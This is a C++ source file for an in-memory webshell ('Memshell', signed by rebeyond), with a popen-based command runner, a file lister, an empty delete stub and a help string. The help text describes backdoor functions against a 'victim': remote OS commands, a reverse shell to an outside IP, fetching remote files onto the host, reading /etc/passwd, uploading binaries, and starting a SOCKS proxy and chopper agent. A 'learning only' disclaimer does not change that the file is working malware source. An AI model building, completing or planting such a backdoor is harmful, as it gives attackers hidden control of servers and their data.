#include "memshell.h"
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>

std::string Memshell::exec(const char * cmd)
{
    std::string result;
    FILE * fp = popen(cmd, "r");
    if(fp)
    {
        char buff[1024] = {0};
        do
        {
            size_t nread = fread(buff, 1, sizeof(buff), fp);
            result.append(buff, nread);
        } while (!feof(fp));
        
        fclose(fp);
    }
    return result;
}

std::string Memshell::list(const char * path)
{
    struct stat sb;
    std::string result;
    if (stat(path, &sb) == -1) {
        return result;
    }

    char buf[1024] = {0};

    if(S_ISDIR(sb.st_mode))
    {
        DIR * dir = opendir(path);
        struct dirent *pDirent = NULL;
        if(dir)
        {
            while ((pDirent = readdir(dir)) != NULL) {
                snprintf(buf, sizeof(buf), "%s/%s", path, pDirent->d_name);
                stat(buf, &sb);
                result += pDirent->d_type == DT_DIR?"r":"-";
                result += "    ";
                result += pDirent->d_name;
                result += "   ";
                snprintf(buf, sizeof(buf), "%d", sb.st_size);
                result += buf;
                result += "\n";
            }
            closedir(dir);
        }
    }
    else
    {
        result += "-";
        result += "    ";
        result += path;
        result += "   ";
        snprintf(buf, sizeof(buf), "%d", sb.st_size);
        result += buf;
        result += "\n";
    }

    return result;
}

std::string Memshell::help()
{
    return "Webshell in Memory:\n\n"
            "Usage:\n"
            "anyurl?pwd=pass //show this help page.\n"
			"anyurl?pwd=pass&model=exec&cmd=whoami  //run os command.\n"
			"anyurl?pwd=pass&model=connectback&ip=8.8.8.8&port=51 //reverse a shell back to 8.8.8.8 on port 51.\n"
			"anyurl?pwd=pass&model=urldownload&url=http://xxx.com/test.pdf&path=/tmp/test.pdf //download a remote file via the victim's network directly.\n"
		    "anyurl?pwd=pass&model=list[del|show]&path=/etc/passwd  //list,delete,show the specified path or file.\n"
			"anyurl?pwd=pass&model=download&path=/etc/passwd  //download the specified file on the victim's disk.\n"
			"anyurl?pwd=pass&model=upload&path=/tmp/a.elf&content=this_is_content[&type=b]   //upload a text file or a base64 encoded binary file to the victim's disk.\n"
			"anyurl?pwd=pass&model=proxy  //start a socks proxy server on the victim.\n"
			"anyurl?pwd=pass&model=chopper  //start a chopper server agent on the victim.\n\n"
			"For learning exchanges only, do not use for illegal purposes.by rebeyond.\n";
}

std::string Memshell::delet(const char * path)
{

}

